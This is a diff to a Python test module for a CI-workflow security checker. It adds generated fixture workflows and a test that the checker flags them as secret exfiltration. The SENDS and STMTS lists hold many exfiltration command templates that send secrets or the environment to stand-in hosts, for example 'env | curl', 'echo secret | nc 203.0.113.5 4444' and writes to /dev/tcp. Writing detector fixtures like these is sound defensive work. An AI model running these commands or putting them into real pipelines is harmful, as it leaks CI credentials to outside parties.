@@ -15,9 +15,11 @@ piped into a shell, continued lines), cut into malformed ones and written with W
 pipelines (includes in every form, images and services with and without a digest, scripts as lists, block
 scalars, strings and flow lists, OIDC tokens and registry credentials, a merge request's text in `eval`);
 and the helpers on their own: the script-line checks, image references, flow collections, paths and
-continued lines.
+continued lines. RA-1's set (`ci_exfil`, SC-WORKFLOW-EXFIL) is workflows built from the shapes that reader reads;
+its hashes were recorded from RA-1's Python, written first and kept aside, which answered every case alike.
 
-All content is inert text: hosts are .invalid, and nothing is executed.
+All content is inert text: hosts are .invalid or documentation addresses (203.0.113.0/24), secret names are made
+up, and nothing is executed.
 """
 import json
 import random
@@ -443,6 +445,94 @@ def gl_corpus(seed=20261004, count=1200):
     return [json.loads(json.dumps(c)) for c in cases]
 
 
+# ---- RA-1's shapes (SC-WORKFLOW-EXFIL): workflows whose steps send secrets, files, a search's output, the
+# environment, by curl, wget, PowerShell, nc, socat and /dev/tcp, to every kind of address, through the step's, job's
+# and workflow's `env:`, the script's variables, files, here-documents, pipes and substitutions; some cut short.
+SECRETS = ["${{ secrets.VPS_HOST }}", "${{ secrets.VPS_SSH_KEY }}", "${{secrets.NPM_TOKEN}}", "${{ secrets['A_B'] }}",
+           "${{ secrets[\"TELEGRAM_CHAT_ID\"] }}", "${{ secrets.DOCKERHUB_TOKEN }}", "${{ env.T }}", "${{ env.W }}",
+           "${{ secrets.SLACK_WEBHOOK_URL }}", "${{ github.sha }}", "${{ toJSON(secrets) }}", "${{ secrets.X }}"]
+VARS = ["$T", "${T}", "$W", "${W:-x}", "$env:T", "%T%", "$H", "$K", "$FOUND", "$b", "\"$T\"", "'$T'", "$HOME"]
+HOSTS = ["http://203.0.113.7:8080/c", "https://collect.invalid/x", "http://localhost:5432/x", "http://postgres/x",
+         "https://webhook.site/abc", "https://api.telegram.org/bot${{ secrets.TELEGRAM_TOKEN }}/sendMessage",
+         "https://hub.docker.com/v2/users/login/", "203.0.113.5", "http://10.1.2.3/x", "$URL", "${{ secrets.HOOK }}",
+         "https://oauth2.googleapis.com/token", "http://[::1]/x", "https://serge.example.invalid/w", "\"$W\"",
+         "https://api.github.com/repos/${{ secrets.REPO }}/dispatches", "http://203.0.113.1/?v=" + SECRETS[0],
+         "https://codecov.io/upload?token=${{ secrets.CODECOV_TOKEN }}&c=1", "http://x.invalid/c/" + SECRETS[1],
+         "HTTP://203.0.113.9", "ftp://203.0.113.9/x", "//203.0.113.9", "https://u:p@collect.invalid:8443/a#f"]
+SENDS = [
+    "curl -s -X POST -d \"host={s}&key={s2}\" {h}", "curl -d \"{v}\" {h}", "curl --data-binary @- {h}",
+    "curl -F f=@found.txt {h}", "curl -T s.txt {h}", "curl -H \"X-Data: {s}\" {h}", "curl -H \"Authorization: Bearer {s}\" {h}",
+    "curl -u user:{s} -T pkg.tgz {h}", "curl --url {h} --data-urlencode \"q@k.txt\"", "curl -sSL {h} -o out",
+    "curl --json '{{\"password\": \"{s}\", \"x\": \"{s2}\"}}' {h}", "curl -d client_secret={s} -d n={s2} {h}",
+    "wget --post-data=\"k={s}\" {h}", "wget --post-file=k.txt {h}", "wget -O- --header=\"X: {v}\" {h}",
+    "Invoke-RestMethod -Uri {h} -Method Post -Body @{{ t = '{s}' }}", "iwr -Uri {h} -Method Post -Body $b",
+    "irm {h} -InFile s.txt", "echo {s} | nc 203.0.113.5 4444", "echo {s} | nc -l 4444", "nc --ssl 203.0.113.5 443 < s.txt",
+    "socat - TCP:203.0.113.5:4444 <<< \"{s}\"", "socat stdio openssl:collect.invalid:443", "echo \"{s}\" > /dev/tcp/203.0.113.5/4444",
+    "cat s.txt > /dev/udp/$HOST/53", "env | curl -X POST --data-binary @- {h}", "printenv | curl -d @- {h}",
+    "gci env: | iwr {h} -Method Post", "set | curl -d @- {h}", "export -p | curl -d @- {h}",
+    "grep -rEho '(AKIA[0-9A-Z]{{16}})' . | curl --data-binary @- {h}", "git log -p --all > hist.txt",
+    "grep -iE 'password|token' hist.txt > found.txt", "rg -i api_key > k.txt", "git grep -n secret | xargs -I{{}} curl -d {{}} {h}",
+    "FOUND=$(git log -p | grep -i secret)", "curl -d \"x=$(git grep -n api_key)\" {h}", "grep -rn TODO . | curl -d @- {h}",
+    "curl -d \"$(echo $(echo {s}))\" {h}", "curl -d \"`cat s.txt`\" {h}", "sudo -E curl -d {v} {h}", "env A=1 curl -d {v} {h}",
+    "timeout 30 curl -d {v} {h}", "xargs -n1 curl -d @- {h} < s.txt", "curl -d @s.txt {h} 2>&1 | tee log.txt",
+    "curl {h} | jq -r .url | xargs curl -L -o a.zip", "/usr/bin/curl.exe -d {v} {h}", "CURL -d {v} {h}",
+]
+STMTS = ["T={s}", "export K={s}", "H=\"{s}\"", "$b = \"k={s}\"", "$env:T = '{s}'", "echo \"{s}\" > s.txt",
+         "echo {s} >> s.txt", "echo {v} | tee -a s.txt", "cat s.txt | base64 > b.txt", "URL=https://collect.invalid/u",
+         "URL=http://203.0.113.8/u", "declare -x W={s}", "local Q", "echo done", "# curl -d {s} {h}", "exit 0",
+         "cat <<EOF > s.txt\n{s}\nEOF", "curl --data-binary @- {h} <<'EOF'\n{s}\nEOF", "curl -d @- {h} <<-X\n  $T\n  X",
+         "if true; then curl -d {v} {h}; fi", "a && curl -d {v} {h} || true", "(curl -d {v} {h})", "curl -d {v} \\\n  {h}"]
+
+
+def exfil_script(rnd):
+    out = []
+    for _ in range(rnd.randint(1, 5)):
+        tpl = rnd.choice(SENDS if rnd.random() < 0.6 else STMTS)
+        out.append(tpl.format(s=rnd.choice(SECRETS), s2=rnd.choice(SECRETS), v=rnd.choice(VARS + SECRETS),
+                              h=rnd.choice(HOSTS)))
+    return "\n".join(out)
+
+
+def exfil_env(rnd, pad):
+    keys = ["T", "W", "H", "K", "URL", "WEBHOOK_URL", "INSTALLATION_ID"]
+    vals = SECRETS + ["https://collect.invalid/x", "plain", "${{ env.T }}", "http://203.0.113.4/z"]
+    return [f"{pad}{rnd.choice(keys)}: {rnd.choice(vals)}" for _ in range(rnd.randint(1, 3))]
+
+
+def exfil_workflow(rnd):
+    lines = ["on: push"]
+    if rnd.random() < 0.3:
+        lines += ["env:"] + exfil_env(rnd, "  ")
+    lines.append("jobs:")
+    for j in range(rnd.randint(1, 2)):
+        lines += [f"  j{j}:", "    runs-on: ubuntu-latest"]
+        if rnd.random() < 0.3:
+            lines += ["    env:"] + exfil_env(rnd, "      ")
+        lines.append("    steps:")
+        for _ in range(rnd.randint(1, 3)):
+            if rnd.random() < 0.3:
+                lines += ["      - env:"] + exfil_env(rnd, "          ")
+                lead = "        run: "
+            else:
+                lead = "      - run: "
+            body = exfil_script(rnd)
+            if "\n" in body or rnd.random() < 0.5:
+                lines.append(lead + rnd.choice(["|", ">-", "|-"]))
+                lines += ["          " + x for x in body.split("\n")]
+            else:
+                lines.append(lead + body)
+    text = "\n".join(lines) + "\n"
+    if rnd.random() < 0.15:
+        k = rnd.randrange(len(text))
+        text = text[:k] + rnd.choice(["", "\"", "'", "$(", "`", "\\", "\n", "|", "&", ">"]) + text[k + rnd.randrange(3):]
+    return text
+
+
+def exfil_corpus(count=3000, seed=20261015):
+    rnd = random.Random(seed)
+    return [exfil_workflow(rnd) for _ in range(count)]
+
+
 def texts():
     """Every corpus's CI files."""
     return yaml_corpus() + wf_corpus() + gl_corpus()
@@ -470,6 +560,7 @@ def snapshot_sets():
         "ci_workflow": lambda: [c for t in texts() for c in (
             ("ci_workflow", {}, t), ("ci_uses", {}, t), ("ci_issues", {"path": WF}, t))],
         "ci_gitlab": lambda: [c for t in texts() for c in (("ci_gitlab", {}, t), ("ci_issues", {"path": GL}, t))],
+        "ci_exfil": lambda: [c for t in exfil_corpus() for c in (("ci_workflow", {}, t), ("ci_issues", {"path": WF}, t))],
         "ci_helpers": lambda: (
             [("ci_check", {"check": c}, line) for line in script_lines_corpus() for c in CHECKS]
             + [("ci_check", {"check": "parse_image"}, v) for v in IMAGE_CASES]
@@ -512,6 +603,17 @@ class CiSnapshotTests(unittest.TestCase):
                      "token-install"):
             self.assertGreater(kinds.count(kind), 80, kind)
         self.assertEqual(sum(len(i) for i in got[1::2]), len(kinds))           # every finding is an issue
+
+    def test_secrets_sent_out(self):
+        got = self.answers("ci_exfil")
+        found = [f for a in got[0::2] for f in a["findings"] if f[0] in ("exfil", "sweep")]
+        self.assertGreater(sum(1 for f in found if f[0] == "sweep"), 400)
+        for plain in ("http", "socket", None):
+            self.assertGreater(sum(1 for f in found if f[0] == "exfil" and f[2]["plain"] == plain), 300, plain)
+        sevs = [r["sev"] for issues in got[1::2] for _line, r in issues if r["id"] == "SC-WORKFLOW-EXFIL"]
+        self.assertEqual(len(sevs), len(found))                                # every finding is an issue
+        self.assertGreater(sevs.count("MAJOR"), 500)
+        self.assertGreater(sevs.count("CRITICAL"), 1500)
 
     def test_helpers(self):
         got = self.answers("ci_helpers")
